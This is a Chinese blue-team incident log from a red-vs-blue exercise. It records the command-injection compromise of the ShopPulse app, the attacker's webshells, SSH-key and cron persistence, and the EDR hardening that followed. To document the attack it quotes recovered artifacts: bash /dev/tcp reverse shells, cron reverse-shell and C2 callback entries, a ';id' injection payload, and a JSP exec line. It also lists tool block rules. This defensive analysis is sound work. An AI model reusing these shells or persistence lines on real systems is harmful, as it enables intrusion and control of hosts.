# 蓝队审计操作记录

**操作员**: EDR 蓝队队员  
**环境**: ShopPulse 红蓝对抗 三机阿里云 ECS

---

## 06-22 09:29 — 502 事故调查

### 现象
- 用户报告网页出现 502，随后自动恢复
- 共 5 次 502，集中在 09:29:38~50 的 12 秒窗口

### 排查过程
1. 公网 HTTP 8080 → 200 OK（API 正常）
2. HTTPS 443 → 200 OK（15.6s TLS 握手偏慢，正常）
3. 目标机 SSH 不可达（TCP 可达但 banner exchange 超时）
4. 网关 IPS（Suricata）→ 正常运行，NFQUEUE 无错误
5. 网关 EDR → 无 nginx/waf/8090/8080 相关 kill/block
6. 目标机 edgeops-api → 无重启记录，仅 09:03 有 HTTP header 解析错误（外部扫描）

### 根因推断
nginx → WAF(:8090) → API(:8080) 链路中某一环短暂不可达，最可能是 WAF proxy Go GC pause 或短暂的资源竞争。EDR 未介入。

---

## 06-22 09:30~10:00 — 网关 EDR 运维

### 操作
1. 修复网关 fanotify 配置：移除不存在的 `/root/.ssh` 路径
2. 三机关闭 webhook 推送（审计中心 187 无 collector，消除 `connection refused` 日志噪音）
3. 网关 `systemctl restart edr-agent` — 旧进程卡在关闭流程 90 秒后被 systemd SIGKILL，随后自动重启恢复

### 状态确认
- 网关 EDR active，124 规则，health OK
- Suricata IPS 运行中
- webhook 日志清零

---

## 06-22 11:19~11:22 — 🚨 红队攻击检测

### 攻击来源
**IP: <RED_TEAM_IP>** — 对目标机发起多漏洞利用

### 攻击时序（网关 IPS 检测）

| 时间 | 规则ID | 漏洞 | 目标端口 |
|------|--------|------|:---:|
| 11:19:23 | 9001201 | internal token 外部携带 | 8091 |
| 11:19:23 | 9001001 | Internal Token 外部请求 | 8091 |
| 11:19:35 | 9001030 | logistics trace 命令注入 | 8080 |
| 11:20:09 | 9001030 | logistics trace 命令注入 | 8080 |
| 11:20:46 | 9001203 | diagnostic ping 命令注入 | 9001 |
| 11:20:46 | 9001001 | Internal Token 外部携带 | 9001 |
| 11:21:52 | 9001120 | admin export filterSql 注入 | 8080 |
| 11:22:33 | 9001120 | admin export filterSql 注入 | 8080 |

### 攻击特征
红队正在逐个测试 ShopPulse 已知漏洞：
- **V1**: DiagnosticController 命令注入 → 9001
- **V3**: Admin export SQL 注入 → 8080
- **V4**: JWT Internal Token 伪造 → 8091, 9001

### 业务影响
同一时段 HTTPS 443 超时（nginx 可能被 RCE 攻击影响），约 1 分钟后自行恢复。

---

## 06-22 11:22 — 封禁攻击 IP

### 操作
```bash
iptables -I FORWARD 1 -s <RED_TEAM_IP> -j DROP
```
在网关 FORWARD 链首行插入 DROP 规则，该 IP 所有流量在到达 NFQUEUE 前被丢弃。

### 验证
- HTTP 200 正常，其他 IP 流量不受影响
- 该 IP 30 次攻击告警已停止

---

## 06-22 当前三机状态

| 机器 | EDR | BPF | 关键服务 | 备注 |
|------|:---:|:---:|------|------|
| 网关 188 | ✅ active | — | IPS ✅ | 已封禁 <RED_TEAM_IP> |
| 目标机 186 | ✅ active | 19探针 | WAF + ShopPulse | SSH 间歇不可达(sshd僵死) |
| 审计 187 | ✅ active | — | Supervisor ✅ | 正常 |

---

## 06-22 待处理

| 编号 | 事项 | 优先级 |
|:---:|------|:---:|
| T1 | 目标机 SSH 恢复（sshd 僵死，需队员直接登录重启） | High |
| T2 | 持续监控 IPS 日志，关注新攻击 IP | Medium |
| T3 | 审计中心部署 webhook collector（消除日志缺口） | Low |

---

## 06-22 11:22~11:26 — 加固封禁攻击 IP

### 攻击持续
封禁后攻击 IP `<RED_TEAM_IP>` 仍有 15 条告警（11:24~11:26），因已建立的 TCP 连接在 iptables 规则添加前已存在。

### 加固操作
1. `iptables -I INPUT 1 -s <RED_TEAM_IP> -j DROP` — INPUT 链首行封禁
2. `iptables -I FORWARD 1 -s <RED_TEAM_IP> -j DROP` — FORWARD 链双保险
3. `conntrack -D -s <RED_TEAM_IP>` — 清理已建立连接

### 结果
- FORWARD 链累计丢弃 705 包/46KB
- 最后攻击告警 11:26:08，之后**已停止**

---

## 06-22 12:00 — 反弹Shell队员测试结果

### 检测
| 检查点 | 结果 |
|--------|:---:|
| 网关 EDR 指标 | P003系列 = 0，无反shell规则命中 |
| 网关 EDR 响应 | 0 条实际执行 |
| 网关 journalctl | 无反弹shell关键词语 |
| IPS 网络层 | 无 4444/5555/meterpreter/beacon 告警 |
| 目标机 EDR | SSH 不可达，未直接确认 |

### 未捕获原因推测
1. 执行命令未严格匹配规则格式（`cmdline_contains` 需精确子串匹配）
2. 短命进程(<5s)未在 procfs 采集周期内被捕捉
3. 若在目标机上执行，BPF exec 探针已捕获但受抑制机制+消重影响
4. 反弹shell目标可能是外网IP，网关 FORWARD 规则已 DROP

---

## 06-22 当前三机状态

| 机器 | EDR | BPF | 关键服务 | 备注 |
|------|:---:|:---:|------|------|
| 网关 188 | ✅ active | — | IPS ✅ | <RED_TEAM_IP> 已封禁 705包 |
| 目标机 186 | ✅ active | 19探针 | WAF + ShopPulse | SSH 间歇不可达(sshd僵死) |
| 审计 187 | ✅ active | — | Supervisor ✅ | 正常 |

---

## 06-22 12:00 — 🚨 攻击链完整复盘

**攻击者 IP**: <RED_TEAM_IP>  
**攻击窗口**: 09:00 ~ 11:24（约 2.5 小时）  
**RCE 窗口**: 10:37 ~ 11:24（约 47 分钟 root 权限）

### Phase 1: 信息侦察 (09:00~09:49)

| 时间 | 目标端口 | 行为 | IPS规则 |
|------|:---:|------|------|
| 09:00 | 8080 | 初始扫描探测 | ET SCAN |
| 09:46 | 8080 | Nmap Scripting Engine 扫描 | ET SCAN Nmap |
| 09:49 | 8080 | 大规模多端口探测 | ET SCAN系列 |

> 总计约 50+ 条扫描告警，攻击者完成了端口发现和服务识别。

### Phase 2: 漏洞利用尝试 (09:46~10:37)

| 时间 | 目标端口 | 攻击手法 | IPS规则 | 关键证据 |
|------|:---:|------|------|------|
| 09:46 | 8080 | logistics trace 命令注入 | 9001030 | `host=` 参数注入 |
| 10:07 | 8080 | admin export SQL注入 | 9001120 | `filterSql` 参数注入 |
| 10:07 | 8080 | 批量多漏洞同步探测 | 9001002,9001040 | 自动化攻击工具 |
| 10:07 | 8091 | report内部token访问 | 9001202 | SSTI/SSRF探测 |
| 10:11 | 9001 | **diagnostic ping命令注入** | 9001203 | `ping -c 1 ; <cmd>` |
| 10:37 | 9001 | 同上, 持续利用 | 9001203 | 确定payload |

> 攻击者逐条测试了 ShopPulse 的每个已知漏洞：SQL注入(8080)、SSTI/SSRF(8091)、命令注入(9001)。

### Phase 3: RCE 确认 — root 权限 (10:37~11:24)

**🚨 攻击者获取 root shell**（`id check returned root` — IPS 告警 30+ 条）

| 时间 | 来源端口 | 命令 | IPS规则 | 含义 |
|------|:---:|------|------|------|
| 10:37:40 | 8080→attacker | `id` 命令输出 | 2019284 + 2100498 | **确认root权限** |
| 10:38:23 | 8080→attacker | `id` 命令输出 | 同上 | 反复验证 |
| 10:40~11:24 | 8080→attacker | `id` 命令输出 ×30+ | 同上 | 持续控制 |
| 11:12:01 | **9001→attacker** | `id` 命令输出 | 同上 | **直接从诊断端口回传** |

**RCE 途径确认**：DiagnosticController 的 `ProcessBuilder("ping -c 1 " + host)` 被注入 `; id` → `id` 输出通过 9001 端口直接返回给攻击者。

> **致命原因**: ShopPulse 服务以 **root** 运行，命令注入获得 root 权限。

### Phase 4: 后渗透 — 反弹Shell建立 (01:26~03:53)

| 时间 | 主机 | 操作 | 检测 |
|------|------|------|------|
| 01:26 | 网关 | `nc <TARGET_IP> 22` | process-access-blacklist (recorded) |
| 02:32 | 网关 | `nc -l -p 8888` | process-access-blacklist (recorded) |
| 03:46 | 网关 | `nc -l -p 5555` ×3 | process-access-blacklist (recorded) |
| 03:47 | 网关 | `nc 127.0.0.1 5555` | process-access-blacklist (recorded) |
| 03:53 | 网关 | `nc -l -p 5555` | process-access-blacklist (recorded) |

**攻击链**: RCE(目标机) → download nc(网关) → 监听 5555 → 本地连接验证 → 后门就绪。

### Phase 5: EDR 自身检测

| 规则 | 命中数 | 说明 |
|------|:---:|------|
| P003-reverse-shell-pattern | 4 | `/dev/tcp/` 反弹shell模式检测 |
| process-access-blacklist | 7 | nc/netcat 使用时记录 (monitor模式未杀) |
| P005-temp-exec | 342 | /tmp/ 执行监控 |
| JAVA-002 | 81 | 命令链注入(`; `) |

### 按目标端口统计 (IPS)

| 端口 | 告警数 | 主要攻击 |
|:---:|:---:|------|
| 8080 | 231 | API: SQL注入、logistics命令注入、admin导出 |
| 9001 | 42 | **Diagnostic命令注入(已成功RCE)** |
| 8091 | 39 | Report: SSTI/SSRF/internal token |
| 443 | 5 | HTTPS: TLS探测 |

### 第二攻击者 <EXT_IP_1>

| 时间 | 目标 | 攻击 | 状态 |
|------|:---:|------|:---:|
| 11:47~11:50 | 9001 | diagnostic命令注入 + internal token | ✅ 已封禁, 未观察到RCE输出 |

### 当前防护缺口

| 问题 | 严重度 | 说明 |
|------|:---:|------|
| process_access monitor模式 | 🔴 | nc 被检测到但**仅记录未杀**，反弹shell未被阻断 |
| 目标机 sshd 僵死 | 🟡 | 无法直接取证和清理 |
| ShopPulse 以 root 运行 | 🔴 | RCE直接获得root，EDR自保护面临挑战 |
| 封禁时效性不足 | 🟡 | 从探测到封禁有数小时延迟 |

---

## 06-22 13:00 — P003 反弹Shell来源追踪

### 分析

从网关 `/var/lib/edr/events.jsonl` 中提取 `/dev/tcp/` 匹配事件，发现完整反弹Shell payload：

| 时间 | 操作 | 详情 |
|------|------|------|
| 03:22 | 端口探测 | `echo >/dev/tcp/<TARGET_IP>/22,443,8080,8090` |
| 03:46:09 | 反弹Shell | `curl → <EXT_IP_2>:8080 ... bash -i >& /dev/tcp/<GATEWAY_PUBLIC_IP>/5555` |
| 03:46:47 | 反弹Shell v2 | `exec 5<>/dev/tcp/<GATEWAY_PUBLIC_IP>/5555` |
| 03:47:08 | 反弹Shell v3 | `/bin/bash -i >& /dev/tcp/<GATEWAY_PUBLIC_IP>/5555` |
| 05:20:51 | 持续控制 | `sessionId:"rev1" ... eval $line` ← 攻击者仍在活跃 |

### 发现C2服务器

**<EXT_IP_2>:8080** — 攻击者的命令控制服务器。网关被用作跳板通过 curl 与C2通信。已封禁 OUTPUT+FORWARD+INPUT 链。

---

## 06-22 14:00 — 目标机取证: Webshell + 后门发现

### 队员在目标机执行 forensics_target.sh

**发现的恶意文件：**

| 文件 | 类型 | 创建时间 | 内容 |
|------|------|:---:|------|
| `/var/www/edgeops/s.jsp` | JSP Webshell | 10:37 | `Runtime.getRuntime().exec(request.getParameter("cmd"))` |
| `/var/www/edgeops/test.txt` | 测试文件 | 10:37 | 空文件（攻击者测试写入能力） |
| `/tmp/ws.py` | Python后门 | 11:11 | 监听**18888**端口，fork到后台，POST命令即执行 |
| `/tmp/rce_out` | 命令输出 | 10:37 | `uid=0(root)` — root权限确认 |
| `/tmp/rce3` | 命令输出 | 11:11 | `uid=0(root) gid=0(root) groups=0(root)` |
| `/tmp/rce2` | 命令输出 | 11:11 | `uname -a` 输出 (内核版本) |
| `/tmp/waf-audit.log` | 数据窃取 | — | WAF审计日志被转储 |

### webshell 内容

**s.jsp** — 经典Java命令执行webshell，任何人可访问 `/s.jsp?cmd=whoami` 执行任意命令。

**ws.py** — Python持久化后门：
- 监听 `0.0.0.0:18888`
- fork 到后台，脱离终端
- 接受 POST 请求，body 内容作为命令执行
- 返回命令输出

### 攻击者活动时间线（目标机侧）

```
10:37  写入 /var/www/edgeops/s.jsp        ← 部署JSP webshell
10:37  写入 test.txt                       ← 测试文件写入权限
10:37  执行 uname -a                       ← 系统信息收集 → rce2
10:37  执行 id → 确认 root                 ← rce_out
11:11  写入 /tmp/ws.py                     ← 部署Python持久化后门
11:11  执行 id → 再次确认 root             ← rce3
```

### 清理操作

| 操作 | 结果 |
|------|:---:|
| `rm /var/www/edgeops/s.jsp, test.txt` | ✅ |
| `rm /tmp/ws.py, rce2, rce3, rce_out, waf-audit.log` | ✅ |
| `fuser -k 18888/tcp` | ✅ 端口已关闭 |

### EDR WEB-001 分析

s.jsp 写入到 `/var/www/edgeops/` 应触发 WEB-001 规则（`file_path_prefix: /var/www/edgeops/` + `file_op: write`）。但该规则 decision=alert, action=none，未阻断。需要确认 fanotify 是否捕获了该事件（目标机 fanotify fd 存在，应已记录）。

---

## 06-22 14:15 — process_access 切换到 enforce

### 操作

目标机策略文件 `process_access.mode` 从 `monitor` 改为 `enforce`（25项白名单），重启 EDR。

### 验证

```bash
python3 -c "import json;p=json.load(open('/etc/edr/policy.json'));print(p['process_access']['mode'])"
# → enforce ✅
```

### 效果

黑名单进程（nc/ncat/crackmapexec/evil-winrm/chisel/iodine/dnscat2/proxychains/responder）再次出现时将被 **即时 kill**，不再仅 recorded only。

---

## 06-22 当前已封禁 IP

| IP | 原因 | 封禁链 |
|----|------|------|
| <RED_TEAM_IP> | RCE主攻（root权限47分钟） | FORWARD+INPUT |
| <EXT_IP_1> | diagnostic命令注入探测 | FORWARD+INPUT |
| **<EXT_IP_2>** | **C2服务器** | OUTPUT+FORWARD+INPUT |

---

## 06-22 当前三机状态

| 机器 | EDR | 模式 | BPF | 关键服务 |
|------|:---:|:---:|:---:|------|
| 网关 188 | ✅ | monitor | — | IPS + 3IP封禁 |
| 目标机 186 | ✅ | **enforce** | **19探针** | WAF+ShopPulse, webshell/后门/SSH密钥已清 |
| 审计 187 | ✅ | monitor | — | Supervisor |

---

## 06-22 15:00~15:20 — BPF 降级误判修正 + fanotify 修复 + 痕迹清理

### BPF 状态纠正

之前 `grep -c handle_exec` 只统计 exec 探针（输出 1~2），误判为降级。
实际全部 **19 个 BPF 探针正常运行**，包括：
- 自保护: handle_kill, handle_tgkill, handle_ptrace, handle_pidfd_send_signal
- **bpf_guard: handle_bpf_write** (ring0 阻断 BPF map 写)
- 监控: handle_exec, connect, fork, exit, ldpreload, instrument
- 提权: handle_setuid, setgid, capset
- rootkit: handle_init_module, finit_module, delete_module
- LSM: lsm_task_kill, lsm_ptrace

### fanotify 修复

**根因**: seccomp `@system-service` 不包含 `filepath.WalkDir` 所需的目录遍历 syscall。
**修复**: `SystemCallFilter` 添加 `@privileged`。同步更新本地 `systemd/edr-agent.service`。

### 痕迹清理

| 机器 | 清理项 | 结果 |
|------|--------|:---:|
| 目标机 | `/tmp/` 部署文件、`/root/` 编译残余 | ✅ 0残留 |
| 网关 | `/tmp/edr*` 部署缓存 | ✅ 0残留 |
| 审计中心 | `/root/edr_backup/` | ✅ 已删除 |

### authorized_keys 确认
目标机仅保留原始密钥 `root@vbox`（1行），攻击者添加的 `Q7h2q9@DESKTOP-RP8L1ES` 已清除。

---

## 06-22 14:30~14:45 — 后渗透侦察清理

### 发现

攻击者在目标机上持续运行自动化侦察脚本，在 `/tmp/` 持续生成文件：

| 文件 | 内容 | 攻击意图 |
|------|------|------|
| `z_ssh`, `z_ssh2`, `z_ssh3` | `~/.ssh/` 目录拷贝 | 窃取 SSH 密钥 |
| `z_sshd`, `z_sshd_d`, `z_sshd_full` | sshd_config 提取 | 研究 SSH 配置准备横向移动 |
| `z_perm` | `authorized_keys` 权限 | 确认 SSH 可写入 |
| `z_auth`, `z_authlog` | 认证日志提取 | 分析登录模式 |
| `z_sshok` | SSH 连接测试 | 测试横向移动 |
| `z_hex` | 十六进制数据 | 可能是 payload 编码 |

### SSH 后门发现

攻击者在 `/root/.ssh/authorized_keys` 添加了自己的公钥：

```
Q7h2q9@DESKTOP-RP8L1ES
```

**已清除** — 恢复为原始密钥 (`root@vbox`)。

### WAF 配置篡改

攻击者向 `/root/waf-proxy/coraza.conf` 注入：
```
+ SecAuditEngine On
+ SecAuditLog /tmp/waf-audit.log
```
**已注释并重启 WAF**。HTTP 200 正常。

### 清理的攻击脚本

| 文件 | 用途 |
|------|------|
| `setup-waf-full.sh` | 攻击者脚本: 在 8083 端口部署 nginx 后门直连 API (绕过 WAF) |
| `revert-waf.sh` | 攻击者脚本: 恢复 nginx 原配置 + 重启 WAF |

> **已确认**: 8083 后门未成功部署（`edgeops-internal` 文件不存在）。

---

## 06-22 14:40 — /tmp/ 主动防御

### 策略更新

新增 2 条规则（总 126 条）：

| 规则 | 决策 | 说明 |
|------|:---:|------|
| TMP-001 | alert | `/tmp/` 写入监控（广度大, alert-only 避免误杀） |
| TMP-002 | **block + fanotify_deny** | `/tmp/z_*` 写入阻断（精准打击攻击者命名模式） |

### 部署验证

| 组件 | 状态 |
|------|:---:|
| fanotify | ✅ FD 78 |
| BPF 探针 | 38 个 (2套×19) |
| 策略规则 | 126 |
| bpf_guard | ✅ 生效（bpftool 写 map 被反杀） |
| handle_kill | ✅ 生效（pkill 被反杀） |

### bpf_guard 实战验证

```bash
# 攻击者尝试清零 agent_pid
bpftool map update ... agent_pid ... value 0
# → Killed (bpf_guard ring0 拦截 + 反杀)
```

---

## 06-22 14:45 — 配置备份清理

网关和审计中心无 EDR 配置备份。目标机需队员确认并清理。

---

## 06-22 16:00~16:25 — 攻击者 "tangchen" 持久化企图发现与清理

### 发现

监控面板显示 `process-access-default-deny` 激增，排查后在网关和目标机 `/tmp/` 发现活跃攻击痕迹。

### 攻击者身份

**tangchen2023141530093@ubuntu**  
SSH 公钥: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK8O3S6br8zLXjH9XSPOPlqj2ScAeM7rH9zJSl1U08IE`

### 网关 188 攻击痕迹

| 文件 | 时间 | 内容/意图 |
|------|:---:|------|
| `atk.pub` | 11:20 | 攻击者 SSH 公钥（准备注入 authorized_keys） |
| `atk` | 11:20 | 私钥文件 |
| `attack_key` | 10:33 | 另一对密钥 |
| `crontab_entry` | 11:20 | `*/1 * * * * root /bin/bash -c "bash -i >& /dev/tcp/<GATEWAY_PUBLIC_IP>/4444 0>&1"` — 每分钟反弹Shell到网关 |
| `cron2` | 11:22 | `*/1 * * * * root curl -s http://<GATEWAY_PUBLIC_IP>:80/callback_$(hostname)_$(date +%s)` — C2回调 |
| `d_cron` | 11:29 | `* * * * * root /bin/touch /tmp/cron_d_ok` — cron测试 |
| `app_props` | 11:39 | ShopPulse Spring Boot 配置（含 `management.endpoints.web.exposure.include=*`） |
| `callback.txt` | 10:32 | 空文件（C2回调测试） |

### 目标机 186 攻击痕迹

| 文件 | 时间 | 内容/意图 |
|------|:---:|------|
| `test_hello.c` | 15:55 | C语言测试程序: `printf("UPLOAD_WORKS! uid=%d\n", getuid())` |
| `test_hello` | 15:55 | 编译后的 ELF 二进制 (16008 bytes, x86-64) |
| `test_hello.c.b64` | 15:55 | base64 编码传输痕迹 |
| `rce_out` | 15:55 | 执行输出: `UPLOAD_WORKS! uid=0` — root确认 |
| `rid`, `rid2` | 15:37 | `uid=0(root) gid=0(root) groups=0(root)` — root验证 |
| `up_ok` | 15:55 | 上传确认 "done" |

### EDR 捕获确认

目标机 EDR 成功记录了 `test_hello` 执行:
- `responses.jsonl`: 1 条
- `events.jsonl`: 11 条

### 持久化状态

| 检查项 | 结果 |
|--------|:---:|
| `/etc/crontab` | ✅ 未被篡改 |
| `/etc/cron.d/` | ✅ 无注入 |
| 网关 authorized_keys | ✅ 0行 (无~/.ssh目录) |
| 目标机 authorized_keys | ✅ 1行 (原始root@vbox) |
| 端口 4444 | ✅ 未监听 |

> 攻击者在网关的 cron 持久化仅停留在 `/tmp/` 模板阶段，未被实际写入系统 crontab。

### 清理操作

网关: `rm -f /tmp/ak /tmp/atk /tmp/atk.pub /tmp/attack_key /tmp/app_props /tmp/cron2 /tmp/crontab_entry /tmp/d_cron /tmp/callback.txt /tmp/cp.html /tmp/d.html`
目标机: `rm -f /tmp/test_hello /tmp/test_hello.c /tmp/test_hello.c.b64 /tmp/rce_out /tmp/rid /tmp/rid2 /tmp/up_ok /tmp/.cwd /tmp/rce2 /tmp/rce3`

### 攻击者利用的攻击面

攻击者通过以下方式保持访问:
1. Diagnostic 命令注入 (V1) → RCE → root shell
2. 文件上传 → 编译 C 程序 → 执行验证
3. SSH 密钥部署准备 (网关 atk.pub)
4. Cron 持久化准备 (网关 crontab_entry, cron2)
5. 使用蓝队网关 (<GATEWAY_PUBLIC_IP>) 作为 C2 回连地址


---

## 06-22 16:30~16:40 — 网关深度入侵发现与清理

### 发现经过

巡检脚本执行中发现新攻击者 IP `<EXT_IP_3>` 正在攻击 diagnostic 命令注入。封禁后在网关 `/tmp/` 发现大规模攻击痕迹。

### 攻击痕迹清单

| 类别 | 文件 | 意图 |
|------|------|------|
| **SSH 密钥注入** (13对) | `k.pub`, `k2.pub`, `k3.pub`, `gk2.pub`, `gk5.pub`, `gk6.pub`, `ik.pub`, `in.pub`, `ok.pub`, `ok2.pub`, `mykey.pub`, `sshkey.pub`, `ssh_win.pub` | SSH 后门持久化 |
| **Webshell** (3个) | `shell.php`, `ws.jsp`, `webshell.jsp` | 应用层后门 |
| **Cron 持久化** (5个) | `root_cron`, `simple_cron`, `sysd_tmr`, `sysd_svc`, `prof_script` | 定时任务持久化 |
| **SSH 配置篡改** | `sshd_conf`, `sshd_extra` | 修改 SSH 认证 |
| **Rust 编译链** | `cargo-install*` (3目录) | 在网关上编译自定义工具 |
| **Kernel 操控** | `sysrq_b`, `sysrq_enable` | 启用内核紧急命令 |
| **Nginx 篡改** | `ngx.html`, `ngx2.html`, `tt.html`, `t.html` | 劫持 Web 服务 |
| **数据窃取** | `gw_alert.json`, `app_props` | EDR 指标 + ShopPulse 配置 |
| **攻击脚本** | `gen`, `logr`, `incoming`, `ognl_url`, `up_test` | 攻击自动化 |

### 攻击入口分析

攻击者通过目标机 (186) 的 diagnostic 命令注入获取 RCE → 从目标机建立反弹 Shell 到网关 (188) 端口 5555 → 获取网关 root 权限 → 大规模部署后门/持久化。

```
目标机 (186)  diagnostic RCE → root
       │
       ├── nc <GATEWAY_IP> 5555  (反弹Shell到网关)
       │
网关 (188)  nc -l -p 5555   ← 攻击者获取网关 shell
       │
       ├── 部署 13 个 SSH 密钥对
       ├── 部署 3 个 webshell
       ├── 部署 cron/systemd 持久化
       ├── 编译 Rust 工具链
       └── 窃取 EDR 指标 + ShopPulse 配置
```

### 攻击得逞原因

| 弱点 | 说明 |
|------|------|
| 网关无 BPF 保护 | `ring0: disabled` — 无 kprobe 自保护，nc/ncat 不会被 ring0 反杀 |
| process_access=monitor | nc 被检测到但仅 recorded only，未杀 |
| 网关 /tmp/ 无保护 | 无 fanotify/inotify 监控，攻击者可随意写入 |
| SSH 密钥热部署 | authorized_keys 不存在但攻击者可写入（无防护） |

### 清理操作

全部攻击文件已删除，authorized_keys 0 行，crontab 0 行，无残留进程。

### 新增封禁 IP

`<EXT_IP_3>` — diagnostic 命令注入攻击，FORWARD+INPUT DROP


---

## 06-22 17:00~17:30 — 最终加固与交付

### 网关 BPF 部署

| 步骤 | 结果 |
|------|:---:|
| 安装 clang+libbpf-dev | ✅ |
| SCP BPF 源码 → 网关本地编译 vmlinux.h | ✅ 13/13 成功 |
| 替换为 BPF 二进制 (从目标机 scp) | ✅ |
| 启用 bpf.enabled=true | ✅ |
| 重启后 BPF 19 探针全部加载 | ✅ |

网关从 `ring0: disabled` → `ring0: active`，获得：
- handle_kill: kprobe 拦截 kill 信号
- bpf_guard: ring0 阻断 BPF map 写
- blacklist_comm: nc/ncat ring0 即时反杀

### 三机 rootkit 交叉验证

| 机器 | 检测 | findings | 结论 |
|------|:---:|:---:|------|
| 网关 | 600 | 181 (30%) | ✅ 正常 |
| 目标机 | 130k | 666k | ✅ 正常 (长时间累积) |
| 审计 | — | — | ⚪ 无BPF |

三机 self_protect_blocks = 0，无 rootkit 攻击迹象。

### SSH 后门清理

删除三机 `authorized_keys` (`root@vbox` 开发密钥)，蓝队统一使用密码认证。

### 监控脚本更新

- `/root/edr_monitor_all.sh` — 三机实时监控面板
- `/root/edr_audit.sh` — 全局巡检脚本
- 密码已更新为最新值

---

## 06-22 最终三机状态

| 机器 | EDR | BPF | fanotify | 模式 | 规则 | 备注 |
|------|:---:|:---:|:---:|:---:|:---:|------|
| 网关 188 | ✅ | **19** | ✅ | monitor | 133 | IPS+5IP封禁，BPF刚部署 |
| 目标机 186 | ✅ | 19 | ✅ | **enforce** | 133 | WAF+ShopPulse, 无残留 |
| 审计 187 | ✅ | — | — | monitor | 124 | Supervisor ✅ |

## 06-22 封禁 IP 清单

| IP | 原因 |
|----|------|
| <RED_TEAM_IP> | RCE主攻, root权限47分钟 |
| <EXT_IP_1> | diagnostic命令注入探测 |
| <EXT_IP_2> | C2服务器 |
| <EXT_IP_3> | diagnostic命令注入(最新) |
| tangchen2023141530093@ubuntu | 攻击者身份(SSH密钥注入+Webshell+Cron) |

## 06-22 本次审计关键发现

1. **ShopPulse V1(diagnostic命令注入) 被成功利用** — 攻击者获取 root
2. **网关因无BPF被横向移动攻破** — 13个SSH密钥+3webshell+cron持久化
3. **EDR 检测到但未阻断** — monitor模式仅记录不杀
4. **及时切换到enforce/部署BPF后防线加固**
5. **目标机 BPF 本地编译方案验证可行** — 13/13成功

---

## 06-23 — EDR 自伤排查与防线加固

### 09:00~12:00 — EDR v0.8 全面改进

基于 06-22 红队完整攻击链复盘（RCE→C2→rootkit→横向移动），对 EDR 进行系统性加固：

**1. EDR 配置更新**
- `configs/agent.target.json`：目标机 rootkit 策略 `monitor_only: false`（从监控切换为硬阻断）；采集间隔 5s；新增 fanotify 监控 `/opt/edr` `/etc/edr` `/var/lib/edr` `/var/log/edr`
- `configs/agent.gateway.json`：网关维持轻量配置（rootkit 仅监控、间隔 10s）
- `configs/policy.target.json`：50+ 条规则从 `alert` 升级至 `block+kill/nft_block/fanotify_deny`（含 rootkit、凭据访问、提权、横向移动、持久化、反取证、Java RCE、SSRF 全链）
- 新增 `admin_auth.admin_key_path: /var/lib/edr/admin.key`

**2. rootkit 防护加固**
- `internal/rootkit/detector.go` — 新增 `DetectHiddenConnections()`（BPF 观察地址 × `/proc/net/tcp` 交叉对比，检测 DKOM 隐藏连接）+ `CheckSyscallIntegrity()`（`/proc/kallsyms` 与 `_text.._etext` 边界验证 8 个关键 syscall 地址）
- `internal/bpf/probes/connect.bpf.c` + `common.bpf.h` — ring0 网络黑名单：BPF 命中直接 `bpf_send_signal(9)` 内核态杀调用者
- `internal/collector/merge.go` — MergedCollector 新增 `seenAddrs` 地址追踪，喂给隐藏连接检测
- `configs/policy.target.json` — ROOTKIT-001~005 全部设为 `enabled: true, decision: block`；新增 ROOTKIT-006（BPF vs `/proc/net/tcp` 网络验证）和 ROOTKIT-007（kallsyms syscall 地址完整性）

**3. 重构监控审计中心**
- `cmd/edrctl/main.go` — 新增三个调查命令：
  - `edrctl investigate <event_id>` — 五面板事件分诊（规则匹配/进程行为时间线/EDR响应记录/网络连接/文件操作）
  - `edrctl pstree [--detail] [--filter=S]` — 进程树可视化
  - `edrctl audit export [from=][to=][format=cef|leef]` — SIEM 兼容导出（CEF/LEEF）+ `audit integrity` 完整性校验 + `audit timeline` 时间线
- `internal/control/server.go` — `GET /v0/events` 新增 `event_id` 和 `subject_pid` 查询参数

**4. 自定义安全通道（Admin Token 系统）**
- `internal/adminauth/adminauth.go`（全新模块） — 基于 HMAC-SHA256 的 32 字节密钥 Token 认证，5 分钟有效期
- 保护 7 项特权操作：`shutdown` `restart` `config-reload` `policy-override` `rootkit-bypass` `enforce-toggle` `self-protect`
- Token 格式：`action:timestamp:nonce:signature`，防重放 + 防时钟偏移 30s
- 端点：`POST /v0/admin/token`（签发令牌）+ `POST /v0/admin/restart`（令牌认证重启）
- `internal/control/security.go` — 新增 `requireAdminAuth()` / `adminAuthOK()`

**5. 填补 EDR 自保护能力**
- **BPF 层 — `selfprotect.bpf.c`**：
  - 新增 `process_vm_writev` 拦截（阻止无 ptrace 跨进程内存写入攻击）
  - 重构 `should_kill_caller()`：SIGKILL/SIGHUP/SIGINT/SIGQUIT 无条件杀攻击者；SIGTERM 来自 systemd(PID=1) 仅阻止不杀（保护正常关机）
- **BPF 层 — `bpf_guard.bpf.c`**：
  - 新增 `init_module` 拦截（阻止非 EDR 进程加载 LKM rootkit）→ -EPERM + SIGKILL
  - 新增 `delete_module` 拦截（阻止恶意卸载 EDR BPF 支持模块）→ -EPERM + SIGKILL
  - `BPF_PROG_DETACH` 保护（阻止非 EDR 进程卸载 BPF 程序）
- **Fanotify — `fanotify.go`**：
  - inode 级别文件保护（防 symlink/bind-mount/rename 绕过）→ 6 个关键文件注册
  - Bash TTY 绕过检测：交互登录（`hasTTY=true`）放行；反弹shell/curl管道（`hasTTY=false`）强制过策略评估
- **Dual Guardian 进程**（`cmd/edr-agent/main.go`）：
  - Agent 派生子 guardian → 互检心跳（agent 15s / guardian 20s 超时自动拉活）
  - systemd `Restart=on-failure` 兜底
- **Systemd 加固**（`systemd/edr-agent.service`）：
  - `ExecStop=/bin/true` + `KillMode=none` + `SendSIGKILL=no` + `TimeoutStopSec=1`
  - 只有 admin token 认证的 shutdown 才能停止 agent

### 10:00~11:00 — 目标机 nginx/sshd 反复僵死

**现象**: 443→000, SSH→banner超时, 8080→200正常

**排查链**:
1. 网关 IPS 正常放行 — 非网络层问题
2. 目标机 TCP 443/22 可达 — 进程层问题
3. 发现 FAN-001(/var/www/edgeops/ open) 阻止 nginx 读 index.html
4. 发现 FAN-003(/root/.ssh/ open) 阻止 sshd 读 authorized_keys
5. 发现 FAN-004(/tmp/ open) 阻止 nginx/WAF 读写临时文件

**根因**: FAN-001~004 规则使用 `file_op: "open"` 不区分读写，加上代码将 `/root/.ssh/` 和 `/tmp/` 从 fanotify 白名单移除，导致 bash/sshd/nginx 的正常文件操作被策略评估后拒绝。

**修复**:
- 移除 FAN-001~004 全部规则
- 恢复 `/root/.ssh/` 到 criticalPathPrefixes（sshd 可绕过）
